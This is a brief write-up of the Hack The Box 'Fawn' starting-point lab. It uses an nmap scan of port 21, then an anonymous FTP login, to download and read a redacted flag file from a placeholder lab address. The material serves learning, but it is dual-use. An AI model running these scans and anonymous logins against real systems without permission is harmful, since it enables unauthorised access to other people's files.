## 🦌 HTB Starting Point: Fawn  
**Level**: Easy  
**Date**: July 11, 2025  
**Goal**: Identify and exploit an anonymous FTP service to retrieve the user flag.

---

### 🧰 Tools  
- `nmap`  
- `ftp`  
- Basic Linux commands (`ls`, `get`, `cat`)  

---

### 🧭 Steps  

1. 🔎 **Scan the target with `nmap`** to detect FTP and other open services:
   ```bash
   nmap -sV -v -O -sS -p 21 10.129.X.X
   ```

---

### Output
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
```

---

2. 📂 **Connect to the FTP service anonymously:**
   ```bash
   ftp 10.129.X.X
   ```

   When prompted:
   ```
   Name: anonymous
   Password: [press Enter]
   ```

---

3. 📁 **List available files and download the flag:**
   ```bash
   ls
   get flag.txt
   quit
   ```

---

4. 📖 **Read the flag locally:**
   ```bash
   cat flag.txt
   # HTB{REDACTED}
   ```

---

### 💣 Payloads Used  
```bash
nmap -sC -sV -Pn -n -T4 10.129.X.X
ftp 10.129.X.X
# login: anonymous
# password: [enter]
ls
get flag.txt
cat flag.txt
```
